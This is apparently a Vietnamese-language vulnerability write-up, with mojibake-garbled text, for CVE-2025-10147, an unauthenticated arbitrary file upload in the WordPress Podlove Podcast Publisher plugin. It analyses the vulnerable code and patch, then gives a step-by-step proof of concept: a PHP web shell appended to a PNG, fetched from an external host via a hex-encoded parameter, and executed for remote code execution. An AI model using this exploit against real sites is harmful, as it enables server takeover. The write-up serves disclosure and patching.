# CVE-2025-10147 Analysis & POC


<!--more-->

## CVE & Basic Info
Plugin **Podlove Podcast Publisher** cho **WordPress** cÃ³ lá»— há»•ng cho phÃ©p **arbitrary file uploads** do thiáº¿u kiá»ƒm tra loáº¡i tá»‡p trong hÃ m `'move_as_original_file'` á»Ÿ táº¥t cáº£ cÃ¡c phiÃªn báº£n tá»›i vÃ  bao gá»“m **4.2.6**. Äiá»u nÃ y cho phÃ©p **unauthenticated attackers** táº£i lÃªn cÃ¡c tá»‡p tÃ¹y Ã½ lÃªn mÃ¡y chá»§ cá»§a site bá»‹ áº£nh hÆ°á»Ÿng, Ä‘iá»u cÃ³ thá»ƒ dáº«n tá»›i **remote code execution**.

* **CVE ID**: [CVE-2025-10147](https://www.cve.org/CVERecord?id=CVE-2025-10147)
* **Vulnerability Type**: Arbitrary File Upload
* **Affected Versions**: <= 4.2.6
* **Patched Versions**: 4.2.7
* **CVSS severity**: High (10)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Podlove Podcast Publisher Plugin](https://wordpress.org/plugins/podlove-podcasting-plugin-for-wordpress/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Podlove Podcast Publisher**: **4.2.6** (vulnerable) vÃ  **4.2.7** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) hoáº·c báº¥t ká»³ cÃ´ng cá»¥ so sÃ¡nh (diff) nÃ o Ä‘á»ƒ kiá»ƒm tra vÃ  so sÃ¡nh khÃ¡c biá»‡t giá»¯a hai phiÃªn báº£n.

## Analysis

### Vulnerable Code 

Theo mÃ´ táº£ cá»§a CVE thÃ¬ vá»‹ trÃ­ lá»—i náº±m á»Ÿ hÃ m `move_as_original_file()` 

```php {title="image.php - v2.6.6" hl_lines=[3] data-open=true}
public function move_as_original_file($file)
{
    $move_new_file = @rename($file, $this->original_file());

    if (false === $move_new_file) {
        Log::get()->addWarning(
            sprintf(
                __('Podlove Image Cache: The downloaded image could not be moved to %s.'),
                $this->original_file()
            )
        );
    }
}
```

HÃ m `move_as_original_file($file)`
* Thá»±c hiá»‡n **di chuyá»ƒn file táº¡m `$file`** (vá»«a Ä‘Æ°á»£c táº£i vá» tá»« URL)
  â†’ sang **Ä‘Æ°á»ng dáº«n cá»‘ Ä‘á»‹nh** tráº£ vá» bá»Ÿi `$this->original_file()`.
* `rename()` trong PHP = **move file** (chuyá»ƒn vá»‹ trÃ­ file, khÃ´ng copy).
* Dáº¥u `@` dÃ¹ng Ä‘á»ƒ **áº©n lá»—i PHP** náº¿u thao tÃ¡c tháº¥t báº¡i.
* Náº¿u `rename()` tráº£ vá» `false`, plugin ghi cáº£nh bÃ¡o vÃ o log.

```php
public function original_file()
{
    return implode(DIRECTORY_SEPARATOR, [
        $this->upload_basedir, $this->file_name('original')
    ]);
}
```

â†’ Táº¡o **Ä‘Æ°á»ng dáº«n tuyá»‡t Ä‘á»‘i trÃªn server**, vÃ­ dá»¥:

```
/var/www/html/wp-content/cache/podlove/6e/7262f37a8018efafa4764ea97a4c26/original.png
```

`$this->upload_basedir` (tá»« `__construct()`)

```php {title="image.php - v2.6.6" hl_lines=[16,19,21,22] data-open=true}
Class Image {
    public function __construct($url, $file_name = '')
    {
        // FIXME: if $file_name is empty, the url will not work. I must not treat this silently!
        $this->source_url = trim($url ?? '');
        $this->file_name = sanitize_title($file_name);

        // manually remove troublemaking characters
        // @see https://community.podlove.org/t/solved-kind-of-cover-art-disappears-caching-issue/478/
        // @see https://sendegate.de/t/problem-mit-caching-von-grafiken/2947
        if (function_exists('iconv')) {
            $this->file_name = iconv('UTF-8', 'ASCII//TRANSLIT', $this->file_name);
        }
        $this->file_name = preg_replace('~[^-a-z0-9_]+~', '', $this->file_name);

        $this->file_extension = $this->extract_file_extension();
        $this->id = md5($url.$this->file_name);

        // create subdirectories to avoid too many directories in the root directory
        $id_directory = substr($this->id, 0, 2).'/'.substr($this->id, 2);

        $this->upload_basedir = self::cache_dir().$id_directory;
        $this->upload_baseurl = content_url('cache/podlove/').$id_directory;
    }
}
```

ÄÆ°á»£c táº¡o dá»±a trÃªn `cache_dir()` vÃ  hash MD5 cá»§a URL,
â†’ náº±m trong thÆ° má»¥c:

```
wp-content/cache/podlove/<2 kÃ½ tá»± Ä‘áº§u>/<pháº§n cÃ²n láº¡i>/
```

> [!TIP] 
> á» Ä‘Ã¢y ta cÃ³ thá»ƒ chá»‰ truyá»n má»—i `$url`, vÃ­ dá»¥:
>
> `$url="https://example.com/filename.php"` thÃ¬ `$this->id="b1555a128239e3f59ccfb8d17e5b6c5a"`
>
> `$this->upload_basedir="http://localhost/wp-content/cache/podlove/b1/555a128239e3f59ccfb8d17e5b6c5a"`
> 
> > [!Success] Ta cÃ³ thá»ƒ kiá»ƒm soÃ¡t Ä‘Æ°á»£c Ä‘Æ°á»ng dáº«n cá»§a file Ä‘Æ°á»£c táº¡o.

`move_as_original_file()` Ä‘Æ°á»£c gá»i trong hÃ m `download_source()`

```php {title="image.php - v2.6.6" hl_lines=[3,5,6,10,16,18,20,28,29] data-open=true}
public function download_source()
{
    $source_url = $this->source_url;
    ...
    $source_domain = wp_parse_url($source_url, PHP_URL_HOST);
    $current_domain = explode(':', $_SERVER['HTTP_HOST'])[0];

    // if domains match, see if the image is part of the Publisher
    // and can be copied on the filesystem, skipping http
    if ($current_domain == $source_domain) {
        ...
        return;
    }
    // for download_url()
    require_once ABSPATH.'wp-admin/includes/file.php';
    $result = self::download_url($this->source_url);
    ...
    list($temp_file, $response) = $result;

    if (!\Podlove\is_image($temp_file)) {
        ...
        wp_delete_file($temp_file);
        return;
    }

    $this->create_basedir();
    $this->save_cache_data($response);
    $this->move_as_original_file($temp_file);
    wp_delete_file($temp_file);
    $this->add_donotbackup_dotfile();
}
```

HÃ m nÃ y táº£i áº£nh tá»« URL ngÆ°á»i dÃ¹ng cung cáº¥p, kiá»ƒm tra há»£p lá»‡, rá»“i lÆ°u cá»‘ Ä‘á»‹nh vÃ o thÆ° má»¥c cache cá»§a plugin. Cá»¥ thá»ƒ:

1. `$source_url` láº¥y URL hÃ¬nh áº£nh do ngÆ°á»i dÃ¹ng cung cáº¥p.
2. HÃ m tÃ¡ch domain tá»« `$source_url` vÃ  domain hiá»‡n táº¡i cá»§a site (`$_SERVER['HTTP_HOST']`). 
    * Náº¿u hai domain trÃ¹ng nhau â†’ áº£nh náº±m trong cÃ¹ng site thá»±c hiá»‡n logic vÃ  tráº£ vá».
    * Náº¿u khÃ¡c domain â†’ dÃ¹ng `download_url()` Ä‘á»ƒ táº£i file táº¡m vá» mÃ¡y chá»§.

```php {title="image.php - v2.6.6" hl_lines=[4,12,17,31] data-open=true}
public static function download_url($url, $timeout = 300, $extra_args = [])
{
    ...
    $tmpfname = wp_tempnam($url);
    if (!$tmpfname) {
        return new \WP_Error('http_no_file', __('Could not create Temporary file.'));
    }

    $default_args = [
        'timeout' => $timeout,
        'stream' => true,
        'filename' => $tmpfname,
        'sslverify' => \Podlove\get_setting('website', 'ssl_verify_peer') == 'on',
    ];
    $args = array_merge($default_args, $extra_args);

    $response = wp_safe_remote_get($url, $args);

    if (is_wp_error($response)) {
        wp_delete_file($tmpfname);

        return $response;
    }

    if (200 != wp_remote_retrieve_response_code($response)) {
        wp_delete_file($tmpfname);

        return new \WP_Error('http_404', trim(wp_remote_retrieve_response_message($response)));
    }

    return [$tmpfname, $response];
}
```

HÃ m `download_url()` táº£i ná»™i dung tá»« URL vÃ o file táº¡m trÃªn server vÃ  tráº£ vá» **Ä‘Æ°á»ng dáº«n file Ä‘Ã³** cÃ¹ng **response**

3. Kiá»ƒm tra xem file táº£i vá» cÃ³ pháº£i áº£nh há»£p lá»‡ báº±ng `\Podlove\is_image()`

```php {title="helper.php - v2.6.6" hl_lines=[] data-open=true}
function is_image($file)
{
    $type = get_image_type($file);
    $mime = get_image_mime_type($type);

    return substr($mime, 0, 5) == 'image';
}
```

* á» báº£n lá»—i, hÃ m `is_image()` chá»‰ **kiá»ƒm tra MIME type** cá»§a file - cá»¥ thá»ƒ lÃ  láº¥y kiá»ƒu MIME rá»“i xem nÃ³ cÃ³ báº¯t Ä‘áº§u báº±ng "image" khÃ´ng.

> [!BUG]
> Chá»‰ cáº§n file giáº£ dáº¡ng cÃ³ header giá»‘ng áº£nh (vÃ­ dá»¥ file `.php` nhÆ°ng chÃ¨n vÃ i byte áº£nh Ä‘áº§u tiÃªn `image/png`) lÃ  qua máº·t Ä‘Æ°á»£c ngay ğŸ˜¬

```php {title="helper.php - v2.6.7" hl_lines=[20,21,22] data-open=true}
function is_image($file, $filename = "")
{
    // simple PHP based checks
    $type = get_image_type($file);
    $mime = get_image_mime_type($type);
    $mime_is_image = substr($mime, 0, 5) == 'image';

    // more checks using WP helpers
    if (!$filename) {
      $filename = basename($file);
    }
    
    $check = wp_check_filetype_and_ext($file, $filename);
    $ext = isset($check['ext']) && $check['ext'] ? strtolower($check['ext']) : null;
    $wp_type = isset($check['type']) && $check['type'] ? strtolower($check['type']) : null;

    $wp_type_looks_correct = stripos($wp_type, 'image/') === 0;
    
    // denielist some exts for extra safety
    $danger_exts = [
      'php', 'php3', 'php4', 'php5', 'phtml', 'phar', 'pl', 'py', 'rb', 'cgi', 'asp', 'aspx', 'jsp',
    ];

    $ext_looks_dangerous = empty($ext) || in_array($ext, $danger_exts, true);

    return $mime_is_image && !$ext_looks_dangerous && $wp_type_looks_correct; 
}
```

* Báº£n vÃ¡ Ä‘Ã£ thÃªm cáº£ má»™t má»› kiá»ƒm tra cháº·t hÆ¡n:
    * Váº«n giá»¯ check MIME gá»‘c (`$mime_is_image`)
    * ThÃªm check qua WordPress helper [`wp_check_filetype_and_ext()`](https://developer.wordpress.org/reference/functions/wp_check_filetype_and_ext/) Ä‘á»ƒ so khá»›p Ä‘uÃ´i file vÃ  kiá»ƒu MIME thá»±c táº¿
    * Náº¿u khÃ´ng cÃ³ tÃªn file, tá»± láº¥y `basename()` Ä‘á»ƒ kiá»ƒm tra
    * Cháº·n hÃ ng loáº¡t Ä‘uÃ´i nguy hiá»ƒm (`php`, `phar`, `py`, `jsp`, `v.v...`) báº±ng danh sÃ¡ch Ä‘en `$danger_exts`
    * Káº¿t há»£p ba Ä‘iá»u kiá»‡n: pháº£i lÃ  MIME image, Ä‘uÃ´i khÃ´ng nguy hiá»ƒm, vÃ  WP cÅ©ng nháº­n diá»‡n Ä‘Ãºng kiá»ƒu áº£nh

4. Chuyá»ƒn file táº¡m sang vá»‹ trÃ­ tháº­t báº±ng `move_as_original_file($temp_file)`

---

`download_source()` Ä‘Æ°á»£c gá»i tá»« hÃ m `podlove_handle_cache_files()` khi áº£nh chÆ°a tá»“n táº¡i

```php {title="images.php - v4.2.6" data-open=true hl_lines=[3,6,8,9,14]}
function podlove_handle_cache_files()
{
    $source_url = \Podlove\PHP\hex2str(podlove_get_query_var('podlove_image_cache_url'));
    ...

    $image = new Image($source_url, $file_name);

    if (!$image->source_exists()) {
        $image->download_source();
    }
    ...
}

function podlove_get_query_var($var_name)
{
    if (isset($_GET[$var_name])) {
        return $_GET[$var_name];
    }

    return get_query_var($var_name);
}
```

HÃ m `podlove_handle_cache_files()` nháº­n tham sá»‘ `podlove_image_cache_url` tá»« GET request, sau Ä‘Ã³ giáº£i mÃ£ báº±ng `hex2str()` Ä‘á»ƒ chuyá»ƒn tá»« Ä‘á»‹nh dáº¡ng hex sang chuá»—i.
=> Tham sá»‘ `podlove_image_cache_url` pháº£i Ä‘Æ°á»£c truyá»n dÆ°á»›i dáº¡ng mÃ£ hex.

Tiáº¿p theo, hÃ m khá»Ÿi táº¡o Ä‘á»‘i tÆ°á»£ng **Image** nháº±m táº¡o Ä‘Æ°á»ng dáº«n lÆ°u trá»¯ trong cache vÃ  thá»±c hiá»‡n táº£i file tá»« URL Ä‘Ã£ giáº£i mÃ£ vá» mÃ¡y chá»§.
 
`podlove_handle_cache_files()` Ä‘Æ°á»£c Ä‘Äƒng kÃ½ lÃ m callback cho action hook

```php
add_action('wp', 'podlove_handle_cache_files');
``` 

NghÄ©a lÃ  hÃ m sáº½ Ä‘Æ°á»£c gá»i trÃªn má»—i láº§n WordPress xá»­ lÃ½ request.

### Flow
{{< mermaid >}}
graph TD
A["Request with params (podlove_image_cache_url)"] --> B["podlove_handle_cache_files()"]
B --> C["hex2str() â†’ $source_url â†’ new Image(...)"]
C --> D["download_source() â†’ download_url() â†’ temporary file"]
D --> E["is_image() check"]
E -- pass --> F["move_as_original_file() â†’ save to wp-content/cache/podlove/first_2_characters/remaining_characters/"]
F --> G["File accessible â†’ possible RCE"]
E -- fail --> H["Delete temp file â†’ stop"]
{{< /mermaid >}}

## Exploit

### Proof of Concept (PoC)

1. ThÃªm `<php>` tag vÃ o file áº£nh vÃ  Ä‘á»•i extension thÃ nh `.php`

```bash 
echo '<?php system($_REQUEST["cmd"]); ?>' >> rce.png
mv rce.png rce.php
```

```bash
â¯ cat rce.php
ï¿½PNG
â¦
IHDï¿½ï¿½Udï¿½tEXtSoftwaregnome-screenshotï¿½ï¿½>-tEXtCreation TimeSat 01 Nov 2025 02:58:29 PM +075ï¿½ï¿½ï¿½ï¿½IDATHï¿½ï¿½ï¿½A
ï¿½ ï¿½ï¿½GHIï¿½ï¿½lï¿½ï¿½lï¿½Ë…ï¿½ï¿½Kï¿½nï¿½D
ï¿½H)ï¿½ï¿½ï¿½a:kooÜ²<`ï¿½uï¿½oï¿½
ï¿½{ï¿½3ï¿½9ï¿½1ï¿½~ï¿½ï¿½      ï¿½9ï¿½ï¿½ï¿½ï¿½Pï¿½1ï¿½ï¿½ï¿½ï¿½Rï¿½!D>Lkï¿½ï¿½ï¿½FTï¿½rï¿½|ï¿½Ruï¿½ï¿½	uï¿½ï¿½o'ï¿½`ï¿½ï¿½?ï¿½!"ï¿½ï¿½
2kï¿½ï¿½ï¿½IENDï¿½B`ï¿½<?php system($_REQUEST["cmd"]); ?>
```

2. LÆ°u file á»Ÿ Ä‘Ã¢u Ä‘Ã³ trÃªn internet, domain khÃ´ng trÃ¹ng vá»›i wordpress domain website,
vÃ­ dá»¥:

```
https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php
```

3. MÃ£ hÃ³a hex(https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php)

```bash
â¯ echo -n "https://github.com/w41bu1/w41test/raw/refs/heads/main/rce.php" | xxd -p
68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870
```

3. Gá»­i GET request vá»›i param `podlove_image_cache_url=68747470733a2f2f6769746875622e636f6d2f7734316275312f773431746573742f7261772f726566732f68656164732f6d61696e2f7263652e706870`

![File Uploaded](file_uploaded.png "Upload file thÃ nh cÃ´ng")

4. Truy cáº­p file vá»«a táº¡o vÃ  RCE

![Result](result.png "RCE vá»›i file upload")

> [!INFO]
> `02/9acf743e6beb9c8e4395ee694d6504` nhÆ° phÃ¢n tÃ­ch trÆ°á»›c Ä‘Ã³, nÃ³ lÃ  `md5($url)`, sau Ä‘Ã³ táº¡o cáº¥u trÃºc thÆ° má»¥c `first_2_characters/remaining_characters` dá»±a trÃªn káº¿t quáº£ cá»§a `md5()`

## Conclusion

Lá»— há»•ng trong **Podlove Podcast Publisher â‰¤ 4.2.6** cho phÃ©p táº£i lÃªn file tÃ¹y Ã½ do thiáº¿u kiá»ƒm tra Ä‘á»‹nh dáº¡ng trong `move_as_original_file()`. Káº» táº¥n cÃ´ng cÃ³ thá»ƒ táº£i file Ä‘á»™c háº¡i (vÃ­ dá»¥ `.php`) lÃªn thÆ° má»¥c:
`wp-content/cache/podlove/<first2>/<rest>/`,
tá»« Ä‘Ã³ dáº«n Ä‘áº¿n **Remote Code Execution (RCE)** náº¿u file Ä‘Æ°á»£c truy cáº­p cÃ´ng khai.

### Key Takeaway
* NguyÃªn nhÃ¢n: kiá»ƒm tra MIME yáº¿u, khÃ´ng cháº·n pháº§n má»Ÿ rá»™ng nguy hiá»ƒm.
* Báº£n vÃ¡ (â‰¥ 4.2.7): thÃªm xÃ¡c thá»±c báº±ng `wp_check_filetype_and_ext()` vÃ  danh sÃ¡ch denylist.
* CÃ¡ch kháº¯c phá»¥c: cáº­p nháº­t plugin, cháº·n thá»±c thi PHP trong thÆ° má»¥c cache, xÃ³a file láº¡.

## References

[Arbitrary File Upload](https://book.hacktricks.wiki/en/pentesting-web/file-upload/index.html)

[ WordPress Podlove Podcast Publisher Plugin <= 4.2.6 is vulnerable to Arbitrary File Upload ](https://patchstack.com/database/wordpress/plugin/podlove-podcasting-plugin-for-wordpress/vulnerability/wordpress-podlove-podcast-publisher-plugin-4-2-6-unauthenticated-arbitrary-file-upload-vulnerability) 

---

> TÃ¡c giáº£: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-05-cve-2025-10147/  

